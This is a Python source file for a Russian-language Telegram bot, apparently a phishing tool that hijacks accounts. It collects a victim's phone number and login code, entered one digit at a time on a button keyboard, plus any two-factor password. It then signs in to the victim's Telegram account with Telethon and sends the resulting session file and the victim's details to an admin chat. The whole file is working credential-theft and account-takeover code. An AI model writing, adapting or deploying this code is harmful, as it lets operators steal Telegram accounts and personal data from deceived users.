
from aiogram.types import Message, ReplyKeyboardRemove, CallbackQuery
from aiogram.dispatcher import FSMContext
import os
import asyncio

from telethon.errors import SessionPasswordNeededError
from telethon.errors.rpcerrorlist import (
                PhoneCodeInvalidError, FloodWaitError
)

from data import User, ClientTG
from state import GetAccountTG
from markup import code_markup
from loader import vip, bot
from utils import config


@vip.message_handler(content_types=['contact'], state=GetAccountTG.one)
async def contact_handler(msg: Message, state: FSMContext):
    phone = msg.contact.phone_number.replace('', '')

    User(user_id=msg.from_user.id).update_phone(phone=phone)

    if not os.path.exists('./session/{phone}.session'.format(phone=phone[1:])):

        try:
            client = ClientTG(phone=phone).client
            await client.connect()

            send_code = await client.send_code_request(phone=phone)
            if client.is_connected():
                await client.disconnect()

            await msg.answer(
                text='Код отправлен! Введите код:',
                reply_markup=ReplyKeyboardRemove()
            )

            msg_edit = await bot.send_message(
                chat_id=msg.from_user.id,
                text=f'🔑 Код:',
                reply_markup=code_markup()
            )

            await state.update_data(
                    phone=phone,
                    send_code=send_code,
                    code_hash=send_code.phone_code_hash,
                    msg_edit=msg_edit)

            await GetAccountTG.two.set()
        except FloodWaitError as error:
            await msg.answer(
                text=f'❌ Ошибка: {error}'
            )
            await state.finish()
    else:
        await msg.answer(
            text='✅ Сессия уже существует!',
            reply_markup=ReplyKeyboardRemove()
        )
        await state.finish()


@vip.callback_query_handler(text_startswith="code_number:", state=GetAccountTG.two)
async def get_account_tg(call: CallbackQuery, state: FSMContext):
    one = call.data.split(":")[1]
    async with state.proxy() as data:
        data['one'] = one
        msg_edit = data['msg_edit']

        await msg_edit.edit_text(
            text=f'🔑 Код: {one}',
            reply_markup=code_markup()
        )

        await GetAccountTG.three.set()


@vip.callback_query_handler(text_startswith='code_number:', state=GetAccountTG.three)
async def get_account_tg_three(call: CallbackQuery, state: FSMContext):
    two = call.data.split(":")[1]

    async with state.proxy() as data:
        data['two'] = two
        msg_edit = data['msg_edit']
        one = data['one']

    code = one + two

    await msg_edit.edit_text(
        text=f'🔑 Код: {code}',
        reply_markup=code_markup()
    )
    await call.answer()

    await GetAccountTG.four.set()


@vip.callback_query_handler(text_startswith='code_number:', state=GetAccountTG.four)
async def get_account_tg_four(call: CallbackQuery, state: FSMContext):
    three = call.data.split(":")[1]

    async with state.proxy() as data:
        data['three'] = three
        msg_edit = data['msg_edit']
        one = data['one']
        two = data['two']

    code = one + two + three

    await msg_edit.edit_text(
        text=f'🔑 Код: {code}',
        reply_markup=code_markup()
    )
    await call.answer()

    await GetAccountTG.five.set()


@vip.callback_query_handler(text_startswith='code_number:', state=GetAccountTG.five)
async def get_account_tg_five(call: CallbackQuery, state: FSMContext):
    four = call.data.split(":")[1]

    async with state.proxy() as data:
        data['four'] = four
        msg_edit = data['msg_edit']
        one = data['one']
        two = data['two']
        three = data['three']

    code = one + two + three + four

    await msg_edit.edit_text(
        text=f'🔑 Код: {code}',
        reply_markup=code_markup()
    )
    await call.answer()

    await GetAccountTG.load.set()


@vip.callback_query_handler(text_startswith='code_number:', state=GetAccountTG.load)
async def get_account_tg_load(call: CallbackQuery, state: FSMContext):
    five = call.data.split(":")[1]

    async with state.proxy() as data:
        data['five'] = five
        one = data['one']
        two = data['two']
        three = data['three']
        four = data['four']
        msg_edit = data['msg_edit']
        phone = data['phone']
        send_code = data['send_code']
        code_hash = data['code_hash']

    code = one + two + three + four + five

    client = ClientTG(phone=phone).client

    await client.connect()
    
    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)
        await msg_edit.edit_text(
            text='📡 Подключение...'
        )

        with open(f'./session/{phone[1:]}.session', 'rb') as document:
            await bot.send_document(
                chat_id=config("admin_id"),
                document=document,
                caption=f'✅ Сессия получена\n\n👤 Пользователь: {call.from_user.get_mention()}\n🆔: {call.from_user.id}\n📱 Номер: {phone}')
            document.close()
        
        await call.answer('✅ Подключение успешно!')
        await state.finish()

    except SessionPasswordNeededError:
        await msg_edit.edit_text(
            text='🔐 Введите пароль от двухфакторной авторизации:'
        )
        await GetAccountTG.password.set()
        
    except PhoneCodeInvalidError:
        await msg_edit.edit_text(
           text='❌ Неверный код! Попробуйте снова /start'
        )
        await state.finish()
    
    if client.is_connected():
        await client.disconnect()


@vip.message_handler(state=GetAccountTG.password)
async def password_handler(msg: Message, state: FSMContext):
    password = msg.text
    async with state.proxy() as data:
        phone = data['phone']
        code_hash = data['code_hash']

    client = ClientTG(phone=phone).client
    await client.connect()
    
    try:
        await client.sign_in(phone=phone, password=password)
        await msg.answer('✅ Подключение успешно!')

        with open(f'./session/{phone[1:]}.session', 'rb') as document:
            await bot.send_document(
                chat_id=config("admin_id"),
                document=document,
                caption=f'✅ Сессия получена\n\n👤 Пользователь: {msg.from_user.get_mention()}\n🆔: {msg.from_user.id}\n📱 Номер: {phone}')
            document.close()
        
        await state.finish()
        
    except Exception as e:
        await msg.answer(f'❌ Ошибка: {e}')
        await state.finish()
    
    if client.is_connected():
        await client.disconnect()